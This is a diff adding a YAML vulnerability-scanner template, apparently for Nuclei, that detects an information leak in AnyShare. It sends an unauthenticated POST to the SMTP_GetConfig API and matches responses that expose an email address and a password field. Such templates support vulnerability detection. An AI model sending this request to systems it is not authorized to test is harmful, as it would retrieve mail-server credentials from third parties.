@@ -1,0 +1,33 @@
+id: anyshare-smtp-getconfig-info-leak
+info:
+  name: AnyShare SMTP GetConfig Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - raw:
+      - |
+        POST /api/ShareMgnt/SMTP_GetConfig HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\\"email\\\":\\s*\\\"([\\w\\.\\-]+)@([\\w\\.\\-]+)\\\""
+      - type: word
+        words:
+          - "\"password\":"
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: word
+        words:
+          - "null"
+        negative: true
